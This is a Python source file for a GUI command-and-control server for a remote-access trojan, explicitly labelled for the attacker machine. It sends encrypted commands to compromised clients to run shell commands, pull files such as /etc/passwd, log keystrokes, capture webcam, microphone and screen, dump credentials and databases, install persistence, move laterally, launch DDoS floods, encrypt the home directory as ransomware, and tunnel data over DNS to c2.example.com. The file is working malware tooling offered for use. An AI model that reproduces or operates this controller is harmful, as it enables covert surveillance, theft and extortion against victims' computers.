#!/usr/bin/env python3
"""
REVERSESHELL SERVER (Attacker Machine)
Modern GUI for controlling connected clients
"""

import socket
import threading
import json
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, Tk
from datetime import datetime
from pathlib import Path
import base64
import io

import config
import crypto


class ReverseShellServer:
    def __init__(self, root):
        self.root = root
        self.root.title("🐉 REVERSESHELL v2.0 - C2 Server")
        self.root.geometry("1200x800")
        self.root.configure(bg=config.THEME["bg"])

        # Style configuration
        self.setup_styles()

        # Server state
        self.server_socket = None
        self.running = False
        self.clients = {}
        self.current_client = None

        # Build UI
        self.create_widgets()

    def setup_styles(self):
        """Configure ttk styles for dark theme"""
        style = ttk.Style()
        style.theme_use('clam')

        colors = config.THEME

        style.configure("TFrame", background=colors["bg"])
        style.configure("TLabel", background=colors["bg"], foreground=colors["fg"])
        style.configure("TButton", background=colors["button"], foreground="#1e1e2e")
        style.configure("TEntry", fieldbackground=colors["panel"])
        style.configure("TScrollbar", background=colors["panel"])
        style.configure("TNotebook", background=colors["bg"])
        style.configure("TNotebook.Tab", background=colors["panel"], foreground=colors["fg"])

        self.root.option_add("*Button.Background", colors["button"])
        self.root.option_add("*Button.Foreground", "#1e1e2e")
        self.root.option_add("*Button.ActiveBackground", colors["button_hover"])
        self.root.option_add("*Button.Font", ("Segoe UI", 10, "bold"))
        self.root.option_add("*Listbox.Background", colors["panel"])
        self.root.option_add("*Listbox.Foreground", colors["fg"])
        self.root.option_add("*Listbox.SelectBackground", colors["accent"])

    def create_widgets(self):
        """Create all UI widgets"""
        colors = config.THEME

        # Top panel - Server controls
        top_frame = ttk.Frame(self.root, padding="10")
        top_frame.pack(fill=tk.X)

        self.status_label = ttk.Label(top_frame, text="● Server Stopped", font=("Segoe UI", 12, "bold"))
        self.status_label.pack(side=tk.LEFT)
        self.status_label.configure(foreground=colors["error"])

        self.start_btn = tk.Button(
            top_frame, text="▶ Start Server", width=15,
            command=self.toggle_server,
            bg=colors["success"], fg="#1e1e2e",
            font=("Segoe UI", 10, "bold"), relief=tk.FLAT, padx=20
        )
        self.start_btn.pack(side=tk.RIGHT)

        # Middle section
        middle_frame = ttk.Frame(self.root, padding="10")
        middle_frame.pack(fill=tk.BOTH, expand=True)

        # Left panel - Client list
        left_frame = ttk.Frame(middle_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))

        ttk.Label(left_frame, text="📡 Connected Clients", font=("Segoe UI", 11, "bold")).pack(anchor="w")
        ttk.Label(left_frame, text=f"Port: {config.PORT}", font=("Segoe UI", 9)).pack(anchor="w")

        self.client_listbox = tk.Listbox(
            left_frame, width=25, height=15,
            bg=colors["panel"], fg=colors["fg"],
            font=("Consolas", 10), selectbackground=colors["accent"]
        )
        self.client_listbox.pack(fill=tk.Y, pady=5)
        self.client_listbox.bind('<<ListboxSelect>>', self.on_client_select)

        # Right panel - Terminal and commands
        right_frame = ttk.Frame(middle_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Client info bar
        info_frame = ttk.Frame(right_frame)
        info_frame.pack(fill=tk.X, pady=(0, 10))

        self.client_info = ttk.Label(info_frame, text="No client selected", font=("Segoe UI", 10))
        self.client_info.pack(side=tk.LEFT)

        # Notebook for different views
        self.notebook = ttk.Notebook(right_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Terminal tab
        terminal_frame = ttk.Frame(self.notebook)
        self.notebook.add(terminal_frame, text="📟 Terminal")

        self.terminal = scrolledtext.ScrolledText(
            terminal_frame, height=25, width=70,
            bg=colors["panel"], fg=colors["fg"],
            font=("Consolas", 10), insertbackground=colors["accent"]
        )
        self.terminal.pack(fill=tk.BOTH, expand=True)

        # Command input
        cmd_frame = ttk.Frame(right_frame)
        cmd_frame.pack(fill=tk.X, pady=(10, 0))

        self.cmd_entry = tk.Entry(
            cmd_frame, width=50,
            bg=colors["panel"], fg=colors["fg"],
            font=("Consolas", 11), insertbackground=colors["accent"]
        )
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.cmd_entry.bind('<Return>', lambda e: self.execute_command())

        # Quick command buttons
        btn_frame = ttk.Frame(right_frame)
        btn_frame.pack(fill=tk.X, pady=(5, 0))

        self.create_quick_buttons(btn_frame)

        # Module buttons panel
        module_frame = ttk.Frame(right_frame)
        module_frame.pack(fill=tk.X, pady=(10, 0))

        ttk.Label(module_frame, text="🔧 Modules:", font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT)

        self.create_module_buttons(module_frame, right_frame)

    def create_quick_buttons(self, frame):
        """Create quick command buttons"""
        cmd_buttons = [
            ("📁 pwd", self.send_pwd),
            ("📊 Processes", self.list_processes),
            ("⬇️ Download", self.download_file),
            ("⬆️ Upload", self.upload_file),
        ]

        for text, cmd in cmd_buttons:
            tk.Button(frame, text=text, width=12, command=cmd,
                     bg=config.THEME["accent"], fg="#1e1e2e",
                     font=("Segoe UI", 9, "bold"), relief=tk.FLAT).pack(side=tk.LEFT, padx=2)

    def create_module_buttons(self, frame, parent_frame):
        """Create module buttons - Row 1"""
        modules = [
            ("📷 Screenshot", self.take_screenshot),
            ("⌨️ Keylogger", self.toggle_keylogger),
            ("🎥 Webcam", self.capture_webcam),
            ("🎤 Mic", self.record_audio),
            ("📍 Geo", self.get_geolocation),
            ("🔗 Persist", self.install_persistence),
            ("🔍 Scan", self.scan_vulnerabilities),
            ("🌐 Proxy", self.test_proxy),
        ]

        for text, cmd in modules:
            tk.Button(frame, text=text, width=10, command=cmd,
                     bg=config.THEME["warning"], fg="#1e1e2e",
                     font=("Segoe UI", 8, "bold"), relief=tk.FLAT).pack(side=tk.LEFT, padx=1)

        # Row 2 - New modules
        module_frame2 = ttk.Frame(parent_frame)
        module_frame2.pack(fill=tk.X, pady=(5, 0))

        modules2 = [
            ("🔑 Creds", self.dump_credentials),
            ("👑 Privesc", self.scan_privesc),
            ("📡 Sniffer", self.start_sniffer),
            ("➡️ Lateral", self.enumerate_network),
            ("📋 Clipboard", self.get_clipboard),
            ("🎬 ScreenRec", self.record_screen),
            ("📡 Beacon", self.start_beacon),
            ("💾 DeadDrop", self.list_deaddrops),
        ]

        for text, cmd in modules2:
            tk.Button(module_frame2, text=text, width=10, command=cmd,
                     bg=config.THEME["warning"], fg="#1e1e2e",
                     font=("Segoe UI", 8, "bold"), relief=tk.FLAT).pack(side=tk.LEFT, padx=1)

        # Row 3 - Advanced modules
        module_frame3 = ttk.Frame(parent_frame)
        module_frame3.pack(fill=tk.X, pady=(5, 0))

        modules3 = [
            ("🤖 Botnet", self.start_ddos),
            ("💀 Ransom", self.encrypt_files),
            ("🔔 Notify", self.get_notifications),
            ("📧 Email", self.harvest_emails),
            ("🗄️ Database", self.dump_databases),
            ("🔀 DNS Tunnel", self.send_dns_data),
            ("🧬 Poly Payload", self.generate_payload),
        ]

        for text, cmd in modules3:
            tk.Button(module_frame3, text=text, width=10, command=cmd,
                     bg=config.THEME["warning"], fg="#1e1e2e",
                     font=("Segoe UI", 8, "bold"), relief=tk.FLAT).pack(side=tk.LEFT, padx=1)

    def toggle_server(self):
        """Start or stop the server"""
        if self.running:
            self.stop_server()
        else:
            self.start_server()

    def start_server(self):
        """Start listening for connections"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((config.HOST, config.PORT))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1.0)

            self.running = True
            self.status_label.configure(text=f"● Listening on {config.HOST}:{config.PORT}", foreground=config.THEME["success"])
            self.start_btn.configure(text="⏹ Stop Server", bg=config.THEME["error"])

            self.log(f"[+] Server started on port {config.PORT}")
            self.log(f"[+] Waiting for connections...")

            threading.Thread(target=self.accept_connections, daemon=True).start()

        except Exception as e:
            messagebox.showerror("Server Error", str(e))

    def stop_server(self):
        """Stop the server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
            self.server_socket = None

        self.status_label.configure(text="● Server Stopped", foreground=config.THEME["error"])
        self.start_btn.configure(text="▶ Start Server", bg=config.THEME["success"])
        self.log("[-] Server stopped")

    def accept_connections(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                client_id = f"{addr[0]}:{addr[1]}"

                self.clients[client_id] = {
                    "socket": client_socket,
                    "addr": addr,
                    "info": None,
                    "last_seen": datetime.now()
                }

                self.root.after(0, lambda cid=client_id: self.add_client(cid))
                threading.Thread(target=self.handle_client, args=(client_id,), daemon=True).start()

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    self.log(f"[-] Accept error: {e}")

    def handle_client(self, client_id: str):
        """Handle communication with a client"""
        client = self.clients.get(client_id)
        if not client:
            return

        sock = client["socket"]

        try:
            while True:
                data = self.receive_data(sock)
                if not data:
                    break

                try:
                    msg = json.loads(data)
                    msg_type = msg.get("type", "")

                    if msg_type == "info":
                        client["info"] = msg.get("data", {})
                        self.root.after(0, lambda cid=client_id: self.update_client_info(cid))

                    elif msg_type == "response":
                        self.root.after(0, lambda: self.log_response(msg.get("data", {})))

                    elif msg_type == "error":
                        self.root.after(0, lambda: self.log(f"[ERROR] {msg.get('data', 'Unknown error')}"))

                except json.JSONDecodeError:
                    self.log(f"[?] Raw: {data[:100]}")

        except Exception as e:
            self.log(f"[-] Client {client_id} error: {e}")
        finally:
            sock.close()
            self.root.after(0, lambda cid=client_id: self.remove_client(cid))

    def receive_data(self, sock: socket.socket) -> str:
        """Receive encrypted data from socket"""
        length_data = sock.recv(4)
        if not length_data:
            return None
        length = int.from_bytes(length_data, 'big')
        encrypted = b''
        while len(encrypted) < length:
            chunk = sock.recv(length - len(encrypted))
            if not chunk:
                break
            encrypted += chunk
        return crypto.decrypt(encrypted.decode()).decode()

    def send_data(self, sock: socket.socket, data: str):
        """Send encrypted data to socket"""
        encrypted = crypto.encrypt(data.encode())
        length = len(encrypted)
        sock.sendall(length.to_bytes(4, 'big'))
        sock.sendall(encrypted.encode())

    def add_client(self, client_id: str):
        """Add client to the listbox"""
        self.client_listbox.insert(tk.END, client_id)

    def remove_client(self, client_id: str):
        """Remove client from the listbox"""
        try:
            del self.clients[client_id]
            for i in range(self.client_listbox.size()):
                if client_id in self.client_listbox.get(i):
                    self.client_listbox.delete(i)
                    break
            if self.current_client == client_id:
                self.current_client = None
                self.client_info.configure(text="No client selected")
            self.log(f"[-] Client disconnected: {client_id}")
        except:
            pass

    def update_client_info(self, client_id: str):
        """Update client information display"""
        if client_id not in self.clients:
            return
        info = self.clients[client_id]["info"]
        if info:
            display_text = f"{client_id} ({info.get('username', '?')}@{info.get('hostname', '?')})"
            for i in range(self.client_listbox.size()):
                if client_id in self.client_listbox.get(i):
                    self.client_listbox.delete(i)
                    self.client_listbox.insert(i, display_text)
                    break

    def on_client_select(self, event):
        """Handle client selection"""
        selection = self.client_listbox.curselection()
        if selection:
            client_id = self.client_listbox.get(selection[0])
            for cid in self.clients:
                if cid in client_id:
                    self.current_client = cid
                    info = self.clients[cid].get("info", {})
                    self.client_info.configure(
                        text=f"👤 {info.get('username', '?')} @ {info.get('hostname', '?')} | "
                            f"🖥️ {info.get('platform', '?')} {info.get('architecture', '?')}"
                    )
                    break

    def execute_command(self):
        """Execute command from input"""
        cmd = self.cmd_entry.get().strip()
        if not cmd or not self.current_client:
            return

        self.log(f"> {cmd}")
        self.cmd_entry.delete(0, tk.END)
        self.send_command(self.current_client, "exec", cmd)

    def send_command(self, client_id: str, cmd_type: str, payload):
        """Send a command to a client"""
        if client_id not in self.clients:
            return

        try:
            data = json.dumps({"type": cmd_type, "payload": payload})
            self.send_data(self.clients[client_id]["socket"], data)
        except Exception as e:
            self.log(f"[-] Send error: {e}")

    def send_pwd(self):
        """Send pwd command"""
        if self.current_client:
            self.send_command(self.current_client, "pwd", "")

    def list_processes(self):
        """List processes on client"""
        if self.current_client:
            self.log("📊 Fetching process list...")
            self.send_command(self.current_client, "processes", "")

    def download_file(self):
        """Download file from client"""
        if not self.current_client:
            return
        filepath = self.cmd_entry.get().strip() or "/etc/passwd"
        self.log(f"⬇️ Downloading {filepath}...")
        self.send_command(self.current_client, "download", filepath)

    def upload_file(self):
        """Upload file to client"""
        if not self.current_client:
            return
        filepath = filedialog.askopenfilename(title="Select file to upload", filetypes=[("All files", "*.*")])
        if not filepath:
            return
        try:
            with open(filepath, 'r') as f:
                content = f.read()
            dest_path = self.cmd_entry.get().strip() or Path(filepath).name
            self.log(f"⬆️ Uploading {filepath} to {dest_path}...")
            self.send_command(self.current_client, "upload", {"path": dest_path, "content": content})
        except Exception as e:
            self.log(f"[-] Upload error: {e}")

    # MODULE COMMANDS
    def take_screenshot(self):
        """Take screenshot from client"""
        if self.current_client:
            self.log("📷 Capturing screenshot...")
            self.send_command(self.current_client, "screenshot", {"action": "capture"})

    def toggle_keylogger(self):
        """Toggle keylogger on client"""
        if self.current_client:
            self.log("⌨️ Starting keylogger...")
            self.send_command(self.current_client, "keylogger", {"action": "start"})

    def get_keylog(self):
        """Get keylog from client"""
        if self.current_client:
            self.log("⌨️ Fetching keylog...")
            self.send_command(self.current_client, "keylogger", {"action": "get"})

    def capture_webcam(self):
        """Capture webcam frame from client"""
        if self.current_client:
            self.log("🎥 Capturing webcam...")
            self.send_command(self.current_client, "webcam", {"action": "capture"})

    def record_audio(self):
        """Record audio from client"""
        if self.current_client:
            self.log("🎤 Recording audio (10s)...")
            self.send_command(self.current_client, "microphone", {"action": "record", "duration": 10})

    def get_geolocation(self):
        """Get geolocation from client"""
        if self.current_client:
            self.log("📍 Getting geolocation...")
            self.send_command(self.current_client, "geolocation", {"action": "all"})

    def install_persistence(self):
        """Install persistence on client"""
        if self.current_client:
            self.log("🔗 Installing persistence...")
            self.send_command(self.current_client, "persistence", {
                "action": "install",
                "payload_path": "client.py",
                "server_ip": self.current_client.split(':')[0],
                "port": config.PORT,
                "method": "all"
            })

    def scan_vulnerabilities(self):
        """Scan for vulnerabilities"""
        if self.current_client:
            target = self.cmd_entry.get().strip() or "127.0.0.1"
            self.log(f"🔍 Scanning {target}...")
            self.send_command(self.current_client, "cve", {"action": "scan", "target": target})

    def test_proxy(self):
        """Test proxy configuration"""
        if self.current_client:
            self.log("🌐 Testing proxy...")
            self.send_command(self.current_client, "proxy", {"action": "test"})

    # NEW MODULE HANDLERS
    def dump_credentials(self):
        """Dump credentials from client"""
        if self.current_client:
            self.log("🔑 Dumping credentials...")
            self.send_command(self.current_client, "credentials", {"action": "dump_all"})

    def scan_privesc(self):
        """Scan for privilege escalation"""
        if self.current_client:
            self.log("👑 Scanning for privilege escalation...")
            self.send_command(self.current_client, "privesc", {"action": "scan"})

    def start_sniffer(self):
        """Start network sniffer"""
        if self.current_client:
            self.log("📡 Starting network sniffer...")
            self.send_command(self.current_client, "sniffer", {"action": "sniff", "count": 100})

    def enumerate_network(self):
        """Enumerate network for lateral movement"""
        if self.current_client:
            self.log("➡️ Enumerating network...")
            self.send_command(self.current_client, "lateral", {"action": "enumerate"})

    def get_clipboard(self):
        """Get clipboard content"""
        if self.current_client:
            self.log("📋 Getting clipboard...")
            self.send_command(self.current_client, "clipboard", {"action": "get"})

    def record_screen(self):
        """Record screen"""
        if self.current_client:
            self.log("🎬 Recording screen (30s)...")
            self.send_command(self.current_client, "screenrecord", {"action": "record", "duration": 30})

    def start_beacon(self):
        """Start beaconing"""
        if self.current_client:
            self.log("📡 Starting beacon...")
            self.send_command(self.current_client, "beacon", {"action": "start", "c2_host": self.current_client.split(':')[0], "c2_port": config.PORT, "interval": 60})

    def list_deaddrops(self):
        """List dead drops"""
        if self.current_client:
            self.log("💾 Listing dead drops...")
            self.send_command(self.current_client, "deaddrop", {"action": "list"})

    def start_ddos(self):
        """Start DDoS attack"""
        if self.current_client:
            target = self.cmd_entry.get().strip() or "127.0.0.1"
            self.log(f"🤖 Starting DDoS against {target}...")
            self.send_command(self.current_client, "botnet", {"action": "ddos", "target_ip": target, "target_port": 80, "attack_type": "tcp"})

    def encrypt_files(self):
        """Encrypt files (ransomware)"""
        if self.current_client:
            self.log("💀 Encrypting files...")
            self.send_command(self.current_client, "ransomware", {"action": "encrypt", "directory": str(Path.home())})

    def get_notifications(self):
        """Get notifications"""
        if self.current_client:
            self.log("🔔 Getting notifications...")
            self.send_command(self.current_client, "notifications", {"action": "get"})

    def harvest_emails(self):
        """Harvest emails"""
        if self.current_client:
            self.log("📧 Harvesting emails...")
            self.send_command(self.current_client, "email", {"action": "harvest"})

    def dump_databases(self):
        """Dump databases"""
        if self.current_client:
            self.log("🗄️ Dumping databases...")
            self.send_command(self.current_client, "database", {"action": "dump"})

    def send_dns_data(self):
        """Send data via DNS tunnel"""
        if self.current_client:
            domain = self.cmd_entry.get().strip() or "c2.example.com"
            self.log(f"🔀 Sending DNS data to {domain}...")
            self.send_command(self.current_client, "dns_tunnel", {"action": "send", "domain": domain, "data": "test"})

    def generate_payload(self):
        """Generate polymorphic payload"""
        if self.current_client:
            self.log("🧬 Generating polymorphic payload...")
            self.send_command(self.current_client, "polymorphic", {"action": "generate", "c2_host": self.current_client.split(':')[0], "c2_port": config.PORT, "method": "all"})

    def log(self, message: str):
        """Add message to terminal"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.terminal.insert(tk.END, f"[{timestamp}] {message}\n")
        self.terminal.see(tk.END)

    def log_response(self, data: dict):
        """Log command response"""
        if isinstance(data, dict):
            if data.get("type") == "processes":
                self.terminal.insert(tk.END, "\n" + data.get("data", "")[:2000] + "\n")
            elif "output" in data:
                self.terminal.insert(tk.END, data["output"] + "\n")
            elif "content" in data:
                self.terminal.insert(tk.END, f"\n📄 File content ({data.get('size', '?')} bytes):\n{data['content'][:2000]}\n")
            elif "message" in data:
                self.terminal.insert(tk.END, f"✓ {data['message']}\n")
            elif "success" in data:
                if data.get("success"):
                    self.terminal.insert(tk.END, f"✓ {json.dumps(data, indent=2)[:2000]}\n")
                else:
                    self.terminal.insert(tk.END, f"✗ {data.get('message', 'Failed')}\n")
            elif "data" in data and "format" in data:
                # Media file (screenshot, webcam, audio)
                self.terminal.insert(tk.END, f"\n📷 Media captured ({data.get('format')}, {data.get('size', '?')} bytes)\n")
                self.save_media(data)
            else:
                self.terminal.insert(tk.END, json.dumps(data, indent=2)[:2000] + "\n")
        else:
            self.terminal.insert(tk.END, str(data) + "\n")
        self.terminal.see(tk.END)

    def save_media(self, data: dict):
        """Save media file to disk"""
        try:
            import base64
            import time
            
            media_type = data.get("format", "bin")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if media_type in ["jpeg", "jpg"]:
                filepath = f"/tmp/opencode/rs_screenshot_{timestamp}.jpg"
            elif media_type == "mp4":
                filepath = f"/tmp/opencode/rs_video_{timestamp}.mp4"
            elif media_type == "wav":
                filepath = f"/tmp/opencode/rs_audio_{timestamp}.wav"
            else:
                filepath = f"/tmp/opencode/rs_data_{timestamp}.{media_type}"
            
            Path("/tmp/opencode").mkdir(parents=True, exist_ok=True)
            
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(data.get("data", "")))
            
            self.log(f"💾 Saved to: {filepath}")
        except Exception as e:
            self.log(f"[-] Save error: {e}")


def main():
    root = tk.Tk()
    app = ReverseShellServer(root)
    root.mainloop()


if __name__ == "__main__":
    main()
